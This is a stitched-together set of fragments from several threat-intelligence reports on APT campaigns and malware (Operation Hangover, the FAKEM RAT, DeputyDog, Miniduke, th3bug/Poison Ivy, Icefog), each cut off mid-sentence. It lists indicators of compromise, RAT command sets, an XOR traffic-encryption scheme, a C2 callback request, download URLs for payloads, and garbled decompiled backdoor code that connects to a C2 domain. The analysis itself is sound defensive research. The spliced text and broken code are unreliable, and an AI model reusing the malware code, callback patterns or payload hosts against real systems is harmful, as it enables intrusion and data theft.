The domain appinonline.com is also hosted on the cloud service mantragrid.com, a Mantra Ventures
company.There is another interesting detail: We found a connection log on one of the open drop folders earlier
mentioned.This log folder was named “test” and data in it was uploaded from an IP belonging to the
French provider OVH.The log contained data from a lab test PC whose registered owner was “innefu”.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                              39</footer>
There is indeed an Indian information security consulting group named Innefu.The domain innefu.com
was registered by the same Arun Bansal.Innefu also hires “ethical hackers”:

<figure></figure>


It is possible that Mantra Tech Ventures hosted the malicious sites by coincidence, and it is possible that
INNEFU (if indeed the mentioned log came from them) just happened to run the malware in an
automatic test system like many other security vendors do as part of their malware analysis research.</section>
<section>

<heading>Conclusion</heading>
When researching the attack against Telenor we were able to uncover that actors apparently operating
from India have been conducting attacks against business, government and political organizations
around the world for over three years.There are also indicators of involvement by private sector companies or persons connected to these,
though these data are circumstantial and may be attempts to implicate said companies.We have no visibility into whether the attacks were done on behalf of others, and if so who
commissioned them or whether all attacks were commissioned by one entity or by several.The methods used were primarily based on different social engineering tactics rather than exploits, but
history has shown that social engineering based attacks can be very successful, confirmed once again by
looking at the data we have been able to uncover.Organizations today need to realize that it’s not a matter of whether they will be compromised but a
question of when and have a plan in place for how to deal with those compromises.<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                        40</footer>
</section>
<section>
Bibliography
<footnote>
1.Scumware.org.Scumware search.scumware.org.[Online]
http://www.scumware.org/report/173.236.24.254.2.MacKenzie, Stuart.[Online] http://www.thetimes.co.uk/tto/multimedia/archive/00372/DOC100113-
100120132_372895a.pdf.3.Wikipedia.CME Group.Wikipedia.[Online] http://en.wikipedia.org/wiki/CME_Group.4.WIPO.WIPO Arbitration and Mediation Center.WIPO.[Online]
http://www.oapi.wipo.net/amc/en/domains/search/text.jsp?case=D2012-1666.5.Domaintools.Domaintools History.Domaintools.[Online]
http://www.domaintools.com/research/whois-
history/?page=details&domain=hackerscouncil.com&date=2011-04-03.6.ThreatExpert Analysis.ThreatExpert.[Online]
http://www.threatexpert.com/report.aspx?md5=4a44b6b6463fa1a8e0515669b10bd338.7.Scumware.org.Scumware search.Scumware.org.[Online]
http://www.scumware.org/report/bluecreams.com.8.Viruswatch.Virus-sites with status changes.Clean-MX.com.[Online] http://lists.clean-
mx.com/pipermail/viruswatch/20110317/023586.html.</footnote>


Passive DNS data provided by ISC Security (https://security.isc.org/)

<figure></figure>


<footer>Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                             41</footer>
</section>
<section>
  Appendixes (available in a separate document)



  A.Samples extracted from Telenor intrusion

  B.Some related cases based on behaviour and malware similarity parameters.Norman Shark offers enterprise
customers a portfolio of solutions for analyzing and building defensible         Strandveien 37
networks against advanced targeted attacks.Formerly part of Norman AS, a        Lysaker, Norway
Norway-based IT security company established in 1984, Norman Shark               +47-67-10-97-00
became an independent company in January 2013, to allow the company to
focus on developing solutions for Threat Discovery, security analytics and       www.normanshark.com
ICS protection to address the growing needs of the enterprise market.</box>
<footer>  Operation Hangover: Unveiling an Indian Cyberattack Infrastructure                                      42</footer>

</section>
</doc>To maintain
                persistent presence, attackers seek to blend in with normal network traffic
                and use ports that are typically allowed by firewalls.As a result, many of the
                malware used in targeted attacks utilize the HTTP and HTTPS protocols to
                appear like web traffic.However, while these malware do give attackers full
                control over a compromised system, they are often simple and configured to
                carry out a few commands.Attackers often use remote access Trojans (RATs), which typically have
                graphical user interfaces (GUIs) and remote desktop features that include
                directory browsing, file transfer, and the ability to take screenshots and
                activate the microphone and web camera of a compromised computer.Attackers often use publicly available RATs like Gh0st, PoisonIvy, Hupigon,
                and DRAT, and “closed-released” RATs like MFC Hunter and PlugX.1 However,
                the network traffic these RATs produce is well-known and easily detectable
                although attackers still successfully use them.2
                Attackers always look for ways to blend their malicious traffic with legitimate
                traffic to avoid detection.We found a family of RATs that we call “FAKEM” that
                make their network traffic look like various protocols.Some variants attempt
                to disguise network traffic to look like Windows® Messenger and Yahoo!®
                Messenger traffic.Another variant tries to make the content of its traffic look
                like HTML.While the disguises the RATs use are simple and distinguishable
                from legitimate traffic, they may be just good enough to avoid further scrutiny.<footnote>1	 Gh0st: http://download01.norman.no/documents/ThemanyfacesofGh0stRat.pdf and http://www.While we observed the use of different themes, the
                content of the emails were always interesting to potential targets.Malware of this type were discussed on Twitter, noted by
                SonicWALL, and found to have been active as far back as September 2009.7
                However, it remains unclear if all the attacks that used this malware were
                connected.The malicious traffic begins with headers similar to actual Windows Messenger
                traffic:
                     MSG 5 N 130
                     MIME-Version: 1.0

                However, beyond this, you will see that the traffic is not valid Windows
                Messenger traffic but may be sufficiently disguised as such to escape further
                scrutiny.</section>


                <footnote>
                6	 UPX is a free tool that compresses executable files.However, it is commonly used to pack
                   malware files, see http://upx.sourceforge.net/ for more details.During our investigation of the fake “Windows Messenger” RAT, we found
                another version that attempts to disguise its network traffic as Yahoo!Messenger traffic.The network communication this version uses begins with
                YMSG, the Yahoo!Messenger traffic header.<figure></figure><caption>FIGURE 4: Malicious traffic disguised as           <figure></figure><caption>FIGURE 5: Legitimate Yahoo!Messenger
                       Yahoo!Messenger traffic</caption>                               traffic</caption>
                However, the network traffic shown in Figure 4 does not resemble legitimate
                Yahoo!Messenger traffic beyond the use of the header, YMSG.Compared
                with the legitimate Yahoo!Messenger traffic shown in Figure 5, it is easy to
                distinguish between the two.A third version of the FAKEM RAT attempts to disguise the network traffic it
                produces as HTML.The malicious traffic begins with strings like
                <html><title>1..56</title><body> or <html><title>12356</title><body>.8




                <footnote>8	 This variant was referenced during an incident documented by AlienVault in March 2012 in
                   http://labs.alienvault.com/labs/index.php/2012/alienvault-research-used-as-lure-in-targeted-
                   attacks/.</footnote>




<noncontent>4 | FAKEM RAT</noncontent>
                This is a fairly rudimentary disguise
                and odd because you would expect
                HTML to be the result of a request to
                a web server and not as something a
                client would send to a web server.<figure></figure>
                                                          <caption>FIGURE 6: Malicious traffic disguised as
                                                                      HTML traffic</caption>
</section>




                     <header>Network Traffic Encryption</header>
<section>

                The network communication between the compromised computer and the RAT
                controller is encrypted.The encryption is the same across variants and done
                at the bit level.Each byte is XOR-ed by every letter in the string, YHCRA,
                and rotated 3 bits to the right after every XOR operation.Encrypting the
                communication ensures that the suspicious data passed between the
                compromised host and the attackers cannot be easily viewed in plain text.The
                communication comes in 1024-byte blobs of data that start with the 32-byte
                header.It appears that attackers may specify any kind of fake headers within
                the first 32 bytes in order to disguise the subsequent network traffic.The following bits of information are initially sent by the compromised host
                when the communication starts:
                 •	 User name
                 •	 Computer name
                 •	 OEM code page identifier
                 •	 What looks like a campaign code but only for some samples
                The commands are not preconfigured as the malware relies on the data sent by
                the server.For instance, when a client receives the command, 0211, this
                signifies that it should execute the accompanying data in memory.<noncontent>5 | FAKEM RAT</noncontent>
                The following are the commands the server issues and their meanings:
                 •	 0211: Execute code.•	 0212: Reconnect to receive data.•	 0213: Sleep, close socket, and reconnect.•	 0214: Exit.To determine the RAT’s capabilities, we allowed the attackers to infiltrate a
                honeypot computer and captured all of the network traffic it generated.We
                decrypted the network traffic and determined the commands the attackers
                used, which include:
                 •	 CmdMana: Command Manager allows attackers to execute shell
                    commands.•	 FileMan: File Manager allows the attackers to browse directories.•	 HostIn: Host Information provides information about the compromised
                    computer.•	 ProcMan: Process Manager gives attackers access to running processes.•	 RegMana: Registry Manager gives attackers access to the Windows
                    registry.•	 Scree: Screen takes a snapshot of the desktop.•	 ServiceMa: Service Manager allows access to services.•	 Passwo: Password accesses stored passwords like those saved in Internet
                    Explorer (IE).•	 UStea: Uploads files from a compromised computer.</section>



<noncontent>6 | FAKEM RAT</noncontent>
                                                        <header>Infrastructure</header>
<section>

                The Windows Messenger samples we analyzed were clustered into five groups
                that did not have overlapping linkages.We also found that the avira.suroot.com domain used as a C&C server
                for yet another malware family we call “cxgid.”
                The *.googmail.com domain was slightly larger and included names like
                apple12.crabdance.com and apple12.co.cc.However, the largest cluster
                revolved around the *.yourturbe.org domain and overlapped with the HTML
                variant.We also found small clusters of the HTML variant that revolved around
                the domain, endless.zapto.org, which was downloaded as a second-stage
                malware by Protux.<figure></figure>

                <caption>FIGURE 7: FAKEM domains associated with the Windows Messenger and HTML variants</caption>




<noncontent>7 | FAKEM RAT</noncontent>
                Meanwhile, the Yahoo!Messenger samples we analyzed all accessed freeavg.sytes.net—a domain name that frequently resolved to different IP addresses.<figure></figure>
                      <caption>FIGURE 8: FAKEM domains associated with the Yahoo!Messenger variant</caption>

                The various samples we collected appear to belong to groups that overlapped a
                little.This suggests that rather than being associated with a particular
                campaign, the use of various FAKEM RATs could be distributed among multiple
                threat actors.</section>



                                                                  <header>Conclusion</header>
<section>
                Knowledge of the attack tools, techniques, and infrastructure of adversaries is
                critical for developing defensive strategies.This research paper examined three
                variants of a RAT—FAKEM—that attempt to disguise the network traffic they
                produce to stay under the radar.Now that popular RATs like Gh0st and PoisonIvy have become well-known and
                can easily be detected, attackers are looking for methods to blend in with
                legitimate traffic.While it is possible to distinguish the network traffic FAKEM
                RAT variants produce for the legitimate protocols they aim to spoof, doing so in
                the context of a large network may not be not easy.The RAT’s ability to mask
                the traffic it produces may be enough to provide attackers enough cover to
                survive longer in a compromised environment.Fortunately, solutions like Trend Micro™ Deep Discovery can help network
                administrators protect their organizations from attacks that use the FAKEM
                RAT by detecting the traffic its variants produce.</section>



<noncontent>8 | FAKEM RAT</noncontent>
<cover>TREND MICRO INCORPORATED                                                       TREND MICRO INCORPORATED
Trend Micro Incorporated (TYO: 4704; TSE: 4704), a global cloud                10101 N. De Anza Blvd.security leader, creates a world safe for exchanging digital information       Cupertino, CA 95014
with its Internet content security and threat management solutions
for businesses and consumers.A pioneer in server security with                U.S. toll free: 1 +800.228.5651
over 20 years’ experience, we deliver top-ranked client, server and            Phone: 1 +408.257.1500
cloud-based security that fits our customers’ and partners’ needs,             Fax: 1 +408.257.2003
stops new threats faster, and protects data in physical, virtualized and       www.trendmicro.com
cloud environments.Powered by the industry-leading Trend Micro™
Smart Protection Network™ cloud computing security infrastructure,
our products and services stop threats where they emerge—from the
Internet.They are supported by 1,000+ threat intelligence experts
around the globe.©2013 by Trend Micro Incorporated.All rights reserved.Trend Micro and the Trend Micro t-ball logo are trademarks or registered trademarks of Trend
Micro Incorporated.All other product or company names may be trademarks or registered trademarks of their owners.</cover>
</doc><doc>
<section>
<heading>
Operation DeputyDog: Zero-Day (CVE-2013-3893) Attack Against
Japanese Targets</heading>
FireEye has discovered a campaign leveraging the recently announced zero-day CVE-2013-3893.This
campaign, which we have labeled ‘Operation DeputyDog’, began as early as August 19, 2013 and appears
to have targeted organizations in Japan.FireEye Labs has been continuously monitoring the activities of
the threat actor responsible for this campaign.Analysis based on our Dynamic Threat Intelligence cluster
shows that this current campaign leveraged command and control infrastructure that is related to the
infrastructure used in the attack on Bit9.Campaign Details

On September 17, 2013 Microsoft published details regarding a new zero-day exploit in Internet Explorer
that was being used in targeted attacks.FireEye can confirm reports that these attacks were directed
against entities in Japan.Furthermore, FireEye has discovered that the group responsible for this
new operation is the same threat actor that compromised Bit9 in February 2013.FireEye detected the payload used in these attacks on August 23, 2013 in Japan.The payload was hosted
on a server in Hong Kong (210.176.3.130) and was named “img20130823.jpg”.Although it had a .jpg
file extension, it was not an image file.The file, when XORed with 0×95, was an executable (MD5:
8aba4b5184072f2a50cbc5ecfe326701).This callback traffic is HTTP over port 443 (which is typically used for HTTPS
encrypted traffic; however, the traffic is not HTTPS nor SSL encrypted).Instead, this clear-text callback
traffic resembles this pattern:
POST /info.asp HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Agtid: [8 chars]08x
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)
Host: 180.150.228.102:443
Content-Length: 1045
Connection: Keep-Alive
Cache-Control: no-cache

[8 chars]08x&[Base64 Content]

The unique HTTP header “Agtid:” contains 8 characters followed by “08x”.The same pattern can be seen
in the POST content as well.A second related sample was also delivered from 111.118.21.105/css/sun.css on September 5, 2013.The
sun.css file was a malicious executable with an MD5 of bd07926c72739bb7121cec8a2863ad87 and it
communicated with the same communications protocol described above to the same command and
control server at 180.150.228.102.</section>
<section>
<heading>
Related Samples
</heading>
We found that both droppers, bd07926c72739bb7121cec8a2863ad87 and
8aba4b5184072f2a50cbc5ecfe326701, were compiled on 2013-08-19 at 13:21:59 UTC.As we examined
these files, we noticed a unique fingerprint.These samples both had a string that may have been an artifact of the builder used to create the binaries.This string was “DGGYDSYRL”, which we refer to as “DeputyDog”.We pivoted off the command and control IP addresses used by these samples and found the following
known malicious domains recently pointed to 180.150.228.102.One of these Hitkit samples connected to a command and control server at
downloadmp3server[.]servemp3[.]com that resolved to 66.153.86.14.This same IP address also hosted
www[.]yahooeast[.]net, a known malicious domain, between March 6, 2012 and April 22, 2012.The domain yahooeast[.]net was registered to 654@123.com.This email address was also used to register
blankchair[.]com – the domain that we see was pointed to the 180.150.228.102 IP, which is the callback
associated with sample 58dc05118ef8b11dcb5f5c596ab772fd, and has been already correlated back to the
attack leveraging the CVE-2013-3893 zero-day vulnerability.</section>
<section>
Threat Actor Attribution
<figure></figure>
Conclusion

While these attackers have a demonstrated previously unknown zero-day exploits and a robust set of
malware payloads, using the techniques described above, it is still possible for network defense
professionals to develop a rich set of indicators that can be used to detect their attacks.This is the first
part of our analysis, we will provide more detailed analysis on the other components of this attack in
subsequent blog post.This entry was posted in Advanced Malware, Exploits, Targeted Attack, Threat Intelligence, Threat
Research by Ned Moran and Nart Villeneuve.Bookmark the permalink.</section>
</doc>......................................4
  2.2 Sharing .........................................4

3 Executive summary                                                                                                                                                 4

4 Analysis                                                                                                                                                          4
  4.1 Summary ........................................4
  4.2 Techniques used ....................................4
  4.3 Implemented commands          ................................4
  4.4 Control .........................................5
  4.5 IOC ...........................................5
      4.5.1 Network .....................................5
      4.5.2 Registry .....................................6
  4.6 Persistency .......................................6
  4.7 Execution process ....................................6

5 Interesting code parts                                                                                                                                             8
  5.1 Init phase of Sample B .................................8
  5.2 Decrypt and setup registry keys ............................8
  5.3 evaluate commands (extract) and                   error       handling                ..................9
  5.4 Internet connect ....................................9
  5.5 Create process calls ...................................10

6 Related indicators information                                                                                                                                    10
  6.1 Network infrastructure .................................10
</toc>

<section>
<heading>1     Scope of work</heading>
In the scope of targeted attacks with a malware labeled as Miniduke by Kaspersky Labs, CIRCL was interested in the way the malware’s later stages work and what kind of interesting information they reveal (e.g.techniques, style, IOCs) .No public analysis was found except the mention in Kaspersky’s report of a custom backdoor, so CIRCL took one of the known samples and started this analysis.However, the work is only covering small aspects (based on the indicators given, lacking full context) and not an exhaustive analysis, and hence the report is as-is, not giving any guarantees of completeness or claiming absolute accuracy.<heading>2.2   Sharing</heading>
The document is classiﬁed as TLP:WHITE, therefore CIRCL encourages everyone to share this analysis report as-is without modiﬁcation.</section>

<section>
<heading>3     Executive summary</heading>
Sample B, contained in Sample A, can be categorized as an exhaustive backdoor, implementing any kind of functionality that can be expected for this kind of attacks.Despite the fact that it doesn’t implement any particular fancy or new technique, the code quality appears to be clean and robust, making rich use of C structures and logging and it shows on some places that it is targeting organizational infrastructures rather than home users.</section>

<section>
<heading>4     Analysis</heading>
<heading>4.1   Summary</heading>
Sample A can be categorized as a container, obfuscating and compressing the real payload.Sample A has been debugged until Sample B’s decompression ﬁnished.The memory segment was dumped to disk for further analysis.The focus of the analysis then shifted to Sample B.Sample B is identiﬁed to be a HTTP controlled backdoor, enabling the attacker to take full control over the victim computer.<heading>4.2   Techniques used</heading>
The analysis has been done using a mixed-approach of dynamic analysis and static analysis in order to overcome some of the obfuscation and encryptions used by the malware.Some of the techniques might have also an impact on the interpretation of the malware.Unfortunately, when we started this investigation, the domain is now pointing to an IP address of Google and returning a 404 Not Found page only.An interaction following the protocol of this malware is therefore no longer possible.grouptumbler .com/news/ f e e d .php?i=Me3tMZEHAuvkc~uJsO~W7lX1vSsgkuW99vD3FRgi</code>

The request is encoded in a custom BASE64 encoding, using the following alphabet: <code>* ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$~</code>



<heading>4.5     IOC</heading>
<heading>4.5.1    Network</heading>
The malware connects via HTTP GET and POST requests to <code>* http : //news .grouptumbler .com</code> and the path is ﬁxed: <code>* /news/ f e e d .php?i=</code>

The variable part is the custom BASE64 encoded string corresponding to ”i=”.A full request looks like: <code>* http : //news .grouptumbler .com/news/ f e e d .php?i={Custom BASE64}</code>

The user agent is always <code>* Mozilla /4.0</code>

Sent accept headers are: <code>* Accept :         */*</code>

<heading>4.5.2    Registry</heading>

The malware creates in <code>* HKCU\ Software \ M i c r o s o f t \ ApplicationManager</code>

a value ’AppID’ with the data it calculates from GetTickcount(), used as an identiﬁer/mutex.<heading>4.6     Persistency</heading>
No persistency mechanisms have been identiﬁed.We assume the ﬁle is only dropped and/or executed on request via stage 2 of Miniduke and not running persistently.<heading>4.7     Execution process</heading>
<figure>

                                                       .A
                                                    Sample




                                              UCL decompression




                                                    Sample B




                                              Sample B execution
</figure>

Update on Jul 03 2014: F-Secure released an analysis<fn>3</fn> of the latest MiniDuke evolution, called ”CosmicDuke”, mentioning similar loaders in old and new samples.That’s why we updated this document to include a graph of the loader:

<footnote>
3 http://www.f-secure.com/static/doc/labs_global/Whitepapers/cosmicduke_whitepaper.pdf
</footnote>

<figure></figure>
</section>

<section>
<heading>5     Interesting code parts</heading>
<heading>5.1     Init phase of Sample B</heading>

Decryption of module and function names

<code>   
 1 int decode_functions_and_start_internet_loop ( )
 2 {
 3   wininet .d l l = decrypt_string(&enc_wininet_dll ) ;
 4   hModule = LoadLibraryA ( wininet .lstrcmpA(&this−>command, ”pwd” ) )
 2        {
 3          ret−>return = −127;
 4          i f ( !’ )
 5        lstrcpyA(&host , ”news .grouptumbler .com” ) ;
 6    else
 7        wnsprintfA(&host , 256 , ”%x%s ” , *&this−>path , 0x409001 ) ;
 8   use_proxy = 0 ;
 9    buffer = 3;
10    this−>hInternetOpen = InternetOpenA ( ” M o z i l l a / 4 .0 ” , 0 , 0 , 0 , 0) ;
11    i f ( this−>hInternetOpen )
12   {
13        i f ( use_proxy )
14        {
15            s u c c e s s _ s e t o p t i o n = InternetSetOptionA ( this−>hInternetOpen , INTERNET_OPTION_PROXY
                       , &b u f f e r , 12) ;
16            i f ( !grouptumbler .com .A 1 7 3 .1 9 4 .7 0 .1 0 1
</code>
     Before that date, the IP was 200.63.46.33
<code>     
1 f i r s t seen 2012−03−14 1 4 : 2 1 : 1 0 −0000
2 l a s t seen 2013−02−26 2 2 : 0 4 : 0 7 −0000
3 news .grouptumbler .com .A 2 0 0 .6 3 .4 6 .2 3
</code>

          The IP 200.63.46.33 was hosting the following domains:
<code>          
 1   dvdform .com .A 2 0 0 .6 3 .4 6 .2 3
 2   www.dvdform .com .A 2 0 0 .6 3 .4 6 .2 3
 3   www.p90xprice .com .A 2 0 0 .6 3 .4 6 .2 3
 4   d e x t e r s e a s o n .com .A 2 0 0 .6 3 .4 6 .2 3
 5   www.d e x t e r s e a s o n .com .A 2 0 0 .6 3 .4 6 .2 3
 6   news .grouptumbler .com .A 2 0 0 .6 3 .4 6 .2 3
 7   www.babylearningdvd .com .A 2 0 0 .6 3 .4 6 .2 3
 8   t u r b o f i r e c o u p o n .com .A 2 0 0 .6 3 .4 6 .2 3
 9   www.t u r b o f i r e c o u p o n .com .A 2 0 0 .6 3 .4 6 .2 3
10   s m a l l v i l l e d v d s e t .com .A 2 0 0 .6 3 .4 6 .2 3
11   www.s m a l l v i l l e d v d s e t .com .A 2 0 0 .6 3 .4 6 .2 3
12   miamivicedvdboxset .com .A 2 0 0 .6 3 .4 6 .2 3
13   www.miamivicedvdboxset .com .A 2 0 0 .6 3 .4 6 .2 3
14   www.sexandthecityondvd .com .A 2 0 0 .6 3 .4 6 .2 3
15   www.sherlockholmesondvd .com .A 2 0 0 .6 3 .4 6 .2 3
16   t r x f o r c e k i t o r i g i n a l .com .A 2 0 0 .6 3 .4 6 .2 3
17   www.t r x f o r c e k i t o r i g i n a l .com .A 2 0 0 .6 3 .4 6 .2 3
18   weddingdressestoday .com .A 2 0 0 .6 3 .4 6 .2 3
19   www.maxheadroomdvdseries .com .A 2 0 0 .6 3 .4 6 .2 3
</code>

None, some or all domains in this list might be malicious as well.The IP address 200.63.46.33 is currently anounced by Panamaserver.com

<code>       
1 20120426 20130311 52284 2 0 0 .6 3 .4 6 .0 / 2 4 −
2 http : // bgpranking .c i r c l .l u / a s n _ d e t a i l s ?asn=52284&source=&date=
</code>

<figure></figure>

         <caption>The hosting company is not a known bulletproof hoster based on the BGP Ranking informa-
     tion<fn>4</fn> .</caption>
         and was announced by two other ISPs before:
<code>         
1 20110118 20120425 23520 2 0 0 .6 3 .4 6 .0 / 2 4 − Columbus network
2 20090601 20110117 27716 2 0 0 .6 3 .4 6 .0 / 2 4 − Advanced Communication Network , S .A.</code>

WHOIS Panamaserver.com

<code>     
 1   inetnum : 200.6 3.40/21
 2   status : allocated
 3   aut−num: N/A
 4   owner : Panamaserver .com
 5   ownerid : PA−PANA2−LACNIC
 6   r e s p o n s i b l e : Ch Group Corp .7   address : B e l l a Vista , El cangrejo , C a l l e 49 , 0 ,
 8   address : 00000 − Panama −
 9   country : PA
10   phone : +507 263 3723 [ ]
11   owner−c : MAC30
12   tech−c : MAC30
13   abuse−c : MAC30
14   i n e t r e v : 2 00.63.4 6/24
15   n s e r v e r : NS1 .PANAMASERVER.COM
16   n s s t a t : 20130311 AA
17   n s l a s t a a : 20130311
18   c r e a t e d : 20080328
19   changed : 20080328
20
21   nic−hdl : MAC30
22   person : Manuel I .Cabrera Ch.23   e−mail : ABUSE@PANAMASERVER.COM
24   address : B e l l a Vista C a l l e 39A y Ave Cuba , 0 ,
25   address : 0000 − Panama − PA
26   country : PA
27   phone : +507 8322443 [ ]
28   c r e a t e d : 20071004
29   changed : 20120311
</code>

<footnote>
       4 http://bgpranking.circl.lu/asn_details?date=2012-12-08;asn=52284
</footnote>

</section>

</doc><doc>
<section>
<heading>
Recent Watering Hole Attacks Attributed to APT Group “th3bug”</heading>
Using Poison Ivy
We’ve uncovered some new data and likely attribution regarding a series of APT watering hole attacks this
past summer.Watering hole attacks are an increasingly popular component of APT campaigns, as many
people are more aware of spear phishing and are less likely to open documents or click on links in
unsolicited emails.Watering hole attacks offer a much better chance of success because they involve
compromising legitimate websites and installing malware intended to compromise website visitors.These
are often popular websites frequented by people who work in specific industries or have political
sympathies to which the actors want to gain access.The attacks discussed in this blog are related to an APT campaign commonly referred to as “th3bug”,
named for the password the actors often use with their Poison Ivy malware.Of note, only the older of the
samples we cover in this blog used that password.We don’t know the reason the actors changed this, but
it could possibly be in reaction to information widely published on the Internet about their activities,
which use that password as a key component to tie the activity together.FireEye in particular published a
paper describing several APT campaigns whose activity they correlate using Poison Ivy passwords.In contrast to many other APT campaigns, which tend to rely heavily on spear phishing to gain victims,
“th3bug” is known for compromising legitimate websites their intended visitors are likely to frequent.Over the summer they compromised several sites, including a well-known Uyghur website written in that
native language.While we were unable to recover the initial vulnerability used, it is possibly the same CVE 2014-0515
Adobe Flash exploit first reported by Cisco TRAC in late July.We cannot confirm the initial compromised
sites, but we noted traffic to several known re-direct sites and the malware was configured to use the same
command and control (C2) server.In addition, the download dates of many of our files pre-date those noted by Cisco by only a few days.All
of the malware were variants of the Poison Ivy Remote Administration Tool (RAT) and were properly
identified as such by our WildFire platform.The targets of the attack were:

      Uyghur sympathizers
      An East Asian office for a major US based computer manufacturer
      A major US university
      An international wholesale and retail telecom provider

We saw the first sample on July 14, 2014.This sample had an interesting PDB string – C:
\Users\sophie\documents\visual studio 2010\Projects\init\Release\init.pdb with a time date string that
exactly matched the PE timestamp of 11 July, 2014.Table 1
<table>
 SHA256         ba509a1d752f3165dc2821e0b1c6543c15988fd7abd4e56c6155de09d1640ce9
 MD5            18ad696f3459bf47f97734f2f14506e3
 File Name      diff.exe
 File Size      97280
 First Seen     2014-07-14 13:55:36
 Download
                www.npec.com .tw/flash/diff.exe
 URL
 Resolution     203.69.42.22
 C2 Domain      diff.qohub.info
 Resolution     115.23.172.151
</table>
The next day we collected several copies of the same malware intended for the same industry.They were
downloaded from one of the download URLs in the below table, but all had the same MD5 and C2 domain.The file was named “PYvBte.jar” but was actually a
Windows executable.The file has the characteristics listed in Table 3, and appears to be a stand-alone
executable version of the Metasploit Meterpreter shell.When this file runs, it downloads a payload from
uyghurweb.net/player/gmuweb.exe and executes it.This file is the same Poison Ivy RAT described in
Table 2.The Meterpreter payload masquerades as a copy of the ApacheBench tool made by the Apache Software
Foundation.<figure></figure>
Table 3
<table>
 SHA256           ccfe61a28f35161c19340541dfd839075e31cd3b661f0936a4c667d805a65136
 MD5              7b0cb4d14d3d8b6ccc7453f7ddb33997
 File Name        PYvBte.jar
 File Size        73802
 First Seen       2014-07-16 01:42:24
 Download
                  uyghurweb .net/player/PYvBte.jar
 URL
</table>
On 21 July, we detected another sample that was noted in the Cisco TRAC blog.The initial download URL
and IP resolution were different than the previous samples, but the C2 domain and resolution matched.This file is also a Poison Ivy variant.Interestingly, the first sample was not logged in VirusTotal prior to our submission, despite the sample
having been in use in the wild for at least seven months.In addition, it is the only sample tied to this
activity we found that used the Poison Ivy password “th3bug”.AVAST wrote a blog related to the activity
we describe here and tied a file with the same name, but the sample we found doesn’t match any other
details of the file they documented.Also of note, the IP resolution for this C2 domain was changed to match the IP resolution of the C2
domains used in the July activity only a few days after these samples were seen.Additionally, the files PE
timestamp was January 21, the day before we detected the sample.Targeted industries for this series are
listed below.There is no way for people browsing to these websites to know in
advance the normally trusted website has been compromised and will serve them malware when they visit
it.Ensuring web browsers and operating system software is fully patched and up-to-date is the best way to
defend against this type of threat.However, to increase success rates APT campaigns can use zero-day
exploits, so even a properly patched system would be compromised.Palo Alto Networks users should use
our firewall’s ability to block executable downloads unless the user specifically authorizes it.If you want to
allow executables through but prefer that they be analyzed for malicious activity, use our WildFire
platform, which correctly identified all of the files listed in this blog as malware and provides users with a
full report on the samples host and network-based activities.</section>
</doc><doc>
<cover>
►►THE ‘ICEFOG’ APT: A TALE
  OF CLOAK AND THREE
  DAGGERS
                          * “三尖刀” - also known as “three
                          daggers” or “three knives” is an
                          ancient Chinese weapon.Known targets include governmental institutions, military contractors,
maritime and shipbuilding groups, telecom operators, industrial and high-tech companies and
mass media.The name “Icefog” comes from a string used in the command-and-control server name in one of the
samples.The command-and-control software is named “Dagger Three”, in the Chinese language.The “Icefog” backdoor set (also known as “Fucobha”) is an interactive espionage tool that is directly
controlled by the attackers.There are versions for both Microsoft Windows and Mac OS X.In its latest
incarnation, Icefog doesn’t automatically exfiltrate data, instead, it is operated by the attackers to
perform actions directly on the victim’s live systems.During Icefog attacks, several other malicious tools and backdoors were uploaded to the victims’
machines, for data exfiltration and lateral movement.This document includes a description
of the backdoors, other malicious tools, together with remediation information.(“Indicators of
compromise”)
</section>



<footer>3</footer>
 
<header>ATTACK ANALYSIS</header>



<section>
    <heading>►►ATTACK ANALYSIS</heading>
The Icefog targeted attacks rely on spear-phishing e-mails that attempt to trick the victim into
opening a malicious attachment or a website.These appear to be
the most common methods used by the attackers at this moment.</section>



<footer>4</footer>

<header>Attack Analysis</header>


<section>
    <heading>SPEAR-PHISHING ATTACKS - MICROSOFT OFFICE EXPLOITS</heading>

The victim receives an e-mail with an attachment that is either a Word (.doc) or Excel (.xls) file.Doc based on his
                                              confession”
 9de808b3147ec72468a5aec4b2c38c20             Temporary dropper            Backdoor.Win32.CMDer.ct
 120f9ed8431a24c14b60003260930c37             wdmaud.drv                   Backdoor.Win32.CMDer.ct

</table>
The attachment is a standard “Tran Duy Linh” exploit for CVE-2012-1856.Another example (d6c90955c6f2a346c9c91be82a1f9d8c) looks like this:


<figure></figure>

                                                                           	
  
</section>



<footer>8</footer>

<header>Attack Analysis</header>


<section>
  <heading>SPEAR-PHISHING ATTACKS - JAVA EXPLOITS</heading>


In addition to Microsoft Office exploits, the Icefog attackers are known to be using Java exploits, hosted
online.For instance, one of the malicious websites used in the attacks was “money.cnnpolicy.com”.The Java exploit
downloaded and executed an Icefog dropper from the following URL:

        www.securimalware[dot]net/info/update.exe

Note: This website is now SINKHOLED by Kaspersky Lab.The “update.exe” is a standard Icefog dropper, with the following information:
<table>
                     MD5                             COMPILEDON                   KASPERSKY NAME
 78d9ac9954516ac096992cf654caa1fc               2012-07-26 03:10:51        Trojan-Downloader.Win32.Agent.gzda
</table>                                                                           

Upon execution, it installs the Icefog malware as “sxs.dll” in the Internet Explorer folder (usually “C:\
Program Files\Internet Explorer”):
<table>

                     MD5                             COMPILEDON                   KASPERSKY NAME
 387ae1e56fa48ec50a46394cc51acce7               2012-07-26 03:10:48        Trojan-Downloader.Win32.Agent.xsub
</table>

To receive control, the malware DLL (“sxs.dll”) uses a technique known as “DLL search order
hijacking”, which abuses the fact that Internet Explorer will load this file from its own directory,
instead of the Windows SYSTEM folder.The backdoor beams out to the command-and-control server at www.setchon[dot]com/jd/
upload.aspx

</section>


<footer>9</footer>
                                                                                        
<header>ATTACK ANALYSIS</header>


<section>
  <heading>SPEAR-PHISHING ATTACKS - HLP VECTOR</heading>

The Icefog attackers are also using HLP files to infect their targets.The HLP files do not contain
exploits but they are abusing certain Windows “features” to drop the malware.It’s interesting to know that Icefog is not the only crew to heavily use HLP “exploits” as a part of their
toolkit.Well known, very effective APT like the “Comments Crew” / APT1, have included the HLP
trick in their kits, along with other lesser known crews.This HLP format is an older one, known as “Winhelp”, which was natively supported up until Vista
and Windows 7, when Microsoft shipped a separate Winhlp32.exe component to help phase out
the technology.Most likely, the choice to abuse Winhelp indicates that the attackers have an idea
